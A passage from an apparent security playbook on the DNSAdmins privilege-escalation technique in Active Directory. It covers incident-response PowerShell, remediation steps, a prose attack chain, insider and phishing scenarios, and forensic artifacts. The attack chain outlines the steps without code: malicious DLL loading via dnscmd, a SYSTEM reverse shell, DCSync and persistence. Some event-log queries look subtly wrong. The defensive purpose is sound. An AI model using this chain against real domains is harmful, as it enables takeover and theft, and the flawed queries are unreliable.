    Set-ADAccountPassword -Identity $_.DistinguishedName -Reset -NewPassword (ConvertTo-SecureString $newPassword -AsPlainText -Force)
}
```

**Step 2: Evidence Collection (Hour 1-2)**
```powershell
# Collect DNS service crash events
Get-EventLog -ComputerName $dc -LogName System -Source "Service Control Manager" -InstanceId 7034, 7035 | 
  Export-Csv -Path "C:\Incident\DNS_Service_Events.csv"

# Collect registry modifications
Get-WinEvent -LogName Security -FilterHashtable @{ EventID = 13; RegistryKeyPath = "*DNS*" } |
  Export-Csv -Path "C:\Incident\Registry_Modifications.csv"

# Collect group membership changes
Get-WinEvent -LogName Security -FilterHashtable @{ EventID = 4732 } |
  Where-Object { $_.Properties[2] -match "DnsAdmins" } |
  Export-Csv -Path "C:\Incident\Group_Changes.csv"
```

**Step 3: Root Cause Analysis (Hour 2-6)**
1. Identify the UNC path used for malicious DLL.
2. Determine source of DLL (internal or external).
3. Identify which user added themselves to DNSAdmins (if applicable).
4. Determine if multiple DCs were compromised.
5. Check for persistence mechanisms (backdoor accounts, etc.).

**Step 4: Remediation (Hour 6+)**
1. Rebuild or restore compromised Domain Controllers.
2. Implement Mitigation strategies above.
3. Audit all DNSAdmins group members and remove unnecessary ones.
4. Reset all Domain Admin passwords (second time).
5. Check for and remove backdoor accounts.

**Step 5: Prevention & Hardening**
- Implement AdminSDHolder protection on DNSAdmins.
- Deploy PAW for DNS admins.
- Enable continuous monitoring of DNS service events.
- Quarterly penetration testing to verify fixes.

---

## 15. RELATED ATTACK CHAIN

**Prerequisites:** DNSAdmins group membership (obtained via phishing, credential spray, or ACL abuse).

**Exploitation:**
1. Identify target DC running DNS service.
2. Create malicious DLL payload.
3. Host DLL on accessible file share.
4. Register DLL via `dnscmd.exe`.
5. Restart DNS service.
6. Catch reverse shell or execute backdoor commands as SYSTEM.

**Post-Exploitation:**
- Create Domain Admin user accounts.
- Dump all domain password hashes via DCSync.
- Establish persistent backdoor access (Golden Ticket, Skeleton Key).
- Lateral movement to all domain systems.
- Data exfiltration and ransomware deployment.

---

## 16. REAL-WORLD EXAMPLES

### Example 1: Insider Threat via DNSAdmins

**Scenario:** Disgruntled IT staff member with DNSAdmins access.

**Attack Timeline:**
1. Insider creates malicious DLL payload.
2. Insider registers DLL on DC via dnscmd.exe.
3. Insider restarts DNS service (establishes reverse shell).
4. Within minutes: Insider has Domain Admin equivalent privileges.
5. Insider creates backdoor account for future access.
6. Insider exfiltrates sensitive data via compromised Domain Controller.

**Detection & Response:**
- Anomaly detection flagged unusual DNS service restart patterns.
- Event ID 5136 showed DNSAdmins group ACL changes (insider's actions).
- Response: Isolate DC, reset all Domain Admin passwords, forensic investigation.

---

### Example 2: DNSAdmins Post-Compromise Discovery

**Scenario:** Attacker compromised user account; later discovered as DNSAdmins member.

**Attack Timeline:**
1. Attacker compromises user via phishing.
2. Attacker adds themselves to DNSAdmins (via ACL abuse or direct addition).
3. Attacker creates malicious DLL and registers it.
4. Attacker restarts DNS service and obtains SYSTEM shell.
5. Attacker adds Domain Admin account for persistence.
6. Days later: SOC detects unusual DNSAdmins membership changes.

**Lesson:** **Regularly audit DNSAdmins group members.** Unexpected memberships indicate potential compromise.

---

## 17. FORENSIC ANALYSIS ARTIFACTS

### Artifacts to Collect

| Artifact | Location | Indicates |
|---|---|---|
| DNS service crash events | Event ID 7034 | Potential DLL injection (service crashed loading DLL) |
| Registry modifications | HKLM\SYSTEM\...\DNS\Parameters | ServerLevelPluginDll value set |
| Group membership changes | Event ID 4732 | User added to DNSAdmins |
| ACL modifications | Event ID 5136 | Potential ACL abuse to add to DNSAdmins |
| DLL artifacts | Temp folders, SMB shares | Malicious DLL file (if found) |
| Process logs | Sysmon Event 1 | Child processes of dns.exe |

---

## References & Authoritative Sources

1. **Original DNSAdmins Research:**
   - [Shay Ber: "The Cute Trick of DNS Admins Membership for Privilege Escalation" (Medium)](https://medium.com/@tzssangglass/the-cute-trick-of-dns-admins-membership-for-privilege-escalation-dcc663f0cd77)

2. **Deep Dives & Updates:**
   - [Semperis: "DnsAdmins Revisited"](https://www.semperis.com/blog/dnsadmins-revisited/)
   - [ired.team: "From DnsAdmins to SYSTEM to Domain Compromise"](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromi)

3. **Custom DNS Plugin DLL:**
   - [GitHub: DNSAdmin-DLL (Example Implementation)](https://github.com/kazkansouh/DNSAdmin-DLL)

4. **Detection & Response:**
   - [Splunk: "DnsAdmins Group Membership Changes"](https://research.splunk.com/endpoint/)
   - [LOLBAS Project: Dnscmd](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/)

5. **MITRE ATT&CK:**
   - [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

---